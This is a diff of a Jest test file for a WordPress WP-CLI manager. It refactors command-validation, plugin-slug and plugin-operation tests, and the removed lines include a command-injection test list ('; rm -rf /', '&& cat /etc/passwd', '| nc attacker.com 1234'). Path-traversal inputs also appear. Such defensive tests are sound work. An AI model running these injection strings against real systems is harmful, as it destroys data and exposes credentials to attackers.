@@ -4,12 +4,17 @@
  */
 
 import { WpCliManager } from '../../src/lib/wordpress/WpCliManager';
+import { isValidPluginSlug } from '../../src/security/validation';
 
 describe('WpCliManager', () => {
   let wpCliManager: WpCliManager;
+  let mockWpCli: any;
 
   beforeEach(() => {
-    wpCliManager = new WpCliManager();
+    mockWpCli = {
+      run: jest.fn()
+    };
+    wpCliManager = new WpCliManager(mockWpCli);
   });
 
   describe('Command Validation', () => {
@@ -69,7 +74,8 @@ describe('WpCliManager', () => {
 
         dangerousChars.forEach(char => {
           // @ts-ignore - accessing private method for testing
-          const result = wpCliManager['validateCommand']('plugin', [`test${char}value`]);
+          // Use 'list' as valid subcommand, then add dangerous arg
+          const result = wpCliManager['validateCommand']('plugin', ['list', `test${char}value`]);
           expect(result.valid).toBe(false);
           expect(result.error).toContain('invalid characters');
         });
@@ -84,23 +90,14 @@ describe('WpCliManager', () => {
           expect(result.valid).toBe(true);
         });
       });
-    });
 
-    describe('Command Injection Prevention', () => {
-      it('should reject command injection attempts', () => {
-        const injectionAttempts = [
-          '; rm -rf /',
-          '&& cat /etc/passwd',
-          '| nc attacker.com 1234',
-          '`whoami`',
-          '$(ls -la)',
-          '; DROP TABLE users;'
-        ];
+      it('should allow valid option flags', () => {
+        const validFlags = ['--format=json', '--status=active', '--field=name', '--skip-plugins', '--allow-root'];
 
-        injectionAttempts.forEach(injection => {
+        validFlags.forEach(flag => {
           // @ts-ignore - accessing private method for testing
-          const result = wpCliManager['validateCommand']('plugin', [injection]);
-          expect(result.valid).toBe(false);
+          const result = wpCliManager['validateCommand']('plugin', ['list', flag]);
+          expect(result.valid).toBe(true);
         });
       });
     });
@@ -110,125 +107,102 @@ describe('WpCliManager', () => {
     it('should accept valid plugin slugs', () => {
       const validSlugs = [
         'my-plugin',
-        'plugin_name',
-        'plugin-123',
-        'test_plugin_2',
+        'plugin123',
         'a',
-        'plugin-with-many-hyphens-and-underscores_123'
+        'plugin-name-here',
+        'plugin_name',
+        'PLUGIN'
       ];
 
       validSlugs.forEach(slug => {
-        // @ts-ignore - accessing private method for testing
-        const result = wpCliManager['isValidPluginSlug'](slug);
+        // Test consolidated validation function from security module
+        const result = isValidPluginSlug(slug);
         expect(result).toBe(true);
       });
     });
 
     it('should reject invalid plugin slugs', () => {
       const invalidSlugs = [
-        '',                          // Empty
-        'a'.repeat(201),            // Too long
-        'plugin name',              // Space
-        'plugin@name',              // Special char
-        'plugin/path',              // Slash
-        '../plugin',                // Path traversal
-        'plugin\\name',             // Backslash
-        'plugin;name',              // Semicolon
-        'PLUGIN-NAME'               // Only lowercase allowed in this test context
+        '',                    // empty
+        '../path',             // path traversal
+        'plugin/name',         // forward slash
+        'plugin\\name',        // backslash
+        'plugin name',         // space
+        'plugin;name',         // semicolon
+        'plugin|name',         // pipe
       ];
 
       invalidSlugs.forEach(slug => {
-        // @ts-ignore - accessing private method for testing
-        const result = wpCliManager['isValidPluginSlug'](slug);
-        expect(result).toBe(false);
-      });
-    });
-
-    it('should reject path traversal attempts in slugs', () => {
-      const traversalAttempts = [
-        '../',
-        '../../etc/passwd',
-        './../plugin',
-        'plugin/../../../etc'
-      ];
-
-      traversalAttempts.forEach(slug => {
-        // @ts-ignore - accessing private method for testing
-        const result = wpCliManager['isValidPluginSlug'](slug);
+        // Test consolidated validation function from security module
+        const result = isValidPluginSlug(slug);
         expect(result).toBe(false);
       });
     });
   });
 
-  describe('Error Sanitization', () => {
-    it('should sanitize user paths from error messages', () => {
-      const errors = [
-        new Error('/Users/john/site/file.php not found'),
-        new Error('/home/jane/wordpress/error'),
-        new Error('C:\\Users\\Bob\\site\\plugin.php failed')
-      ];
+  describe('Execute Command', () => {
+    const mockSite = {
+      id: 'test-site',
+      path: '/path/to/site',
+      name: 'Test Site'
+    } as any;
 
-      errors.forEach(error => {
-        // @ts-ignore - accessing private method for testing
-        const sanitized = wpCliManager['sanitizeError'](error);
-        expect(sanitized).not.toContain('/Users/john');
-        expect(sanitized).not.toContain('/home/jane');
-        expect(sanitized).not.toContain('C:\\Users\\Bob');
-        expect(sanitized).toContain('[USER]');
-      });
+    it('should execute valid commands', async () => {
+      mockWpCli.run.mockResolvedValue({ stdout: 'success', stderr: '' });
+
+      const result = await wpCliManager.execute(mockSite, 'plugin', ['list']);
+
+      expect(result.success).toBe(true);
+      expect(result.output).toBe('success');
+      expect(mockWpCli.run).toHaveBeenCalledWith(mockSite, ['plugin', 'list']);
     });
 
-    it('should sanitize credentials from error messages', () => {
-      const errors = [
-        new Error('Connection failed for user:password@host'),
-        new Error('Auth failed with token=abc123def456')
-      ];
+    it('should reject invalid commands', async () => {
+      const result = await wpCliManager.execute(mockSite, 'eval', ['code']);
 
-      errors.forEach(error => {
-        // @ts-ignore - accessing private method for testing
-        const sanitized = wpCliManager['sanitizeError'](error);
-        expect(sanitized).not.toContain('password');
-        expect(sanitized).not.toContain('abc123def456');
-        expect(sanitized).toContain('[REDACTED]');
-      });
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('not allowed');
+      expect(mockWpCli.run).not.toHaveBeenCalled();
     });
 
-    it('should provide user-friendly error messages', () => {
-      const testCases = [
-        { error: new Error('Could not resolve host'), expected: 'Repository not found or network error' },
-        { error: new Error('authentication failed'), expected: 'Authentication failed' },
-        { error: new Error('already exists'), expected: 'Target directory already exists' }
-      ];
+    it('should handle WP-CLI errors', async () => {
+      mockWpCli.run.mockRejectedValue({ stderr: 'WP-CLI error' });
 
-      testCases.forEach(({ error, expected }) => {
-        // @ts-ignore - accessing private method for testing
-        const sanitized = wpCliManager['sanitizeError'](error);
-        expect(sanitized.toLowerCase()).toContain(expected.toLowerCase());
-      });
+      const result = await wpCliManager.execute(mockSite, 'plugin', ['list']);
+
+      expect(result.success).toBe(false);
+      expect(result.error).toBe('WP-CLI error');
     });
   });
 
   describe('Security Edge Cases', () => {
-    it('should handle null and undefined inputs safely', () => {
+    it('should handle null command safely', () => {
       // @ts-ignore - testing invalid inputs
-      expect(wpCliManager['validateCommand'](null, [])).toEqual({ valid: false, error: expect.any(String) });
+      const result = wpCliManager['validateCommand'](null, []);
+      expect(result.valid).toBe(false);
+    });
 
+    it('should handle undefined command safely', () => {
       // @ts-ignore - testing invalid inputs
-      expect(wpCliManager['validateCommand']('plugin', null)).toEqual({ valid: false, error: expect.any(String) });
+      const result = wpCliManager['validateCommand'](undefined, []);
+      expect(result.valid).toBe(false);
+    });
 
+    it('should handle null slug safely', () => {
       // @ts-ignore - testing invalid inputs
-      expect(wpCliManager['isValidPluginSlug'](null)).toBe(false);
+      expect(isValidPluginSlug(null)).toBe(false);
+    });
 
+    it('should handle undefined slug safely', () => {
       // @ts-ignore - testing invalid inputs
-      expect(wpCliManager['isValidPluginSlug'](undefined)).toBe(false);
+      expect(isValidPluginSlug(undefined)).toBe(false);
     });
 
     it('should handle very long inputs safely', () => {
       const longString = 'a'.repeat(10000);
 
-      // Should not crash
-      // @ts-ignore - accessing private method for testing
-      const result = wpCliManager['isValidPluginSlug'](longString);
+      // Should not crash - testing consolidated validation function
+      const result = isValidPluginSlug(longString);
       expect(result).toBe(false);
     });
 
@@ -241,36 +215,65 @@ describe('WpCliManager', () => {
 
       argsWithNullBytes.forEach(arg => {
         // @ts-ignore - accessing private method for testing
-        const result = wpCliManager['validateCommand']('plugin', [arg]);
+        const result = wpCliManager['validateCommand']('plugin', ['list', arg]);
         // Null bytes should be caught as invalid characters
         expect(result.valid).toBe(false);
       });
     });
   });
 
-  describe('WP-CLI Path Resolution', () => {
-    it('should cache resolved WP-CLI path', async () => {
-      // @ts-ignore - accessing private property
-      wpCliManager['wpCliPath'] = '/test/path/to/wp';
+  describe('Plugin Operations', () => {
+    const mockSite = {
+      id: 'test-site',
+      path: '/path/to/site',
+      name: 'Test Site'
+    } as any;
 
-      // @ts-ignore - accessing private method
-      const path = await wpCliManager['resolveWpCliPath']();
+    it('should activate a plugin', async () => {
+      mockWpCli.run.mockResolvedValue({ stdout: 'Plugin activated.', stderr: '' });
 
-      expect(path).toBe('/test/path/to/wp');
+      const result = await wpCliManager.activatePlugin(mockSite, 'my-plugin');
+
+      expect(result.success).toBe(true);
+      expect(mockWpCli.run).toHaveBeenCalledWith(mockSite, ['plugin', 'activate', 'my-plugin']);
     });
 
-    it('should return null if no WP-CLI binary found', async () => {
-      // Reset cached path
-      // @ts-ignore - accessing private property
-      wpCliManager['wpCliPath'] = null;
+    it('should deactivate a plugin', async () => {
+      mockWpCli.run.mockResolvedValue({ stdout: 'Plugin deactivated.', stderr: '' });
 
-      // This will check actual file system, which likely won't have WP-CLI
-      // in the test environment
-      // @ts-ignore - accessing private method
-      const path = await wpCliManager['resolveWpCliPath']();
+      const result = await wpCliManager.deactivatePlugin(mockSite, 'my-plugin');
 
-      // In CI/test environment, this should be null or 'wp' (system PATH)
-      expect(path === null || path === 'wp').toBe(true);
+      expect(result.success).toBe(true);
+      expect(mockWpCli.run).toHaveBeenCalledWith(mockSite, ['plugin', 'deactivate', 'my-plugin']);
+    });
+
+    it('should delete a plugin', async () => {
+      mockWpCli.run.mockResolvedValue({ stdout: 'Plugin deleted.', stderr: '' });
+
+      const result = await wpCliManager.deletePlugin(mockSite, 'my-plugin');
+
+      expect(result.success).toBe(true);
+      expect(mockWpCli.run).toHaveBeenCalledWith(mockSite, ['plugin', 'delete', 'my-plugin']);
+    });
+
+    it('should get plugin status', async () => {
+      // getPluginStatus uses 'plugin get' which returns a single object, not an array
+      mockWpCli.run.mockResolvedValue({
+        stdout: JSON.stringify({ name: 'my-plugin', status: 'active', version: '1.0.0' }),
+        stderr: ''
+      });
+
+      const result = await wpCliManager.getPluginStatus(mockSite, 'my-plugin');
+
+      expect(result).toBeDefined();
+      expect(result?.status).toBe('active');
+    });
+
+    it('should reject invalid plugin slugs', async () => {
+      const result = await wpCliManager.activatePlugin(mockSite, '../malicious');
+
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid plugin slug');
     });
   });
 });
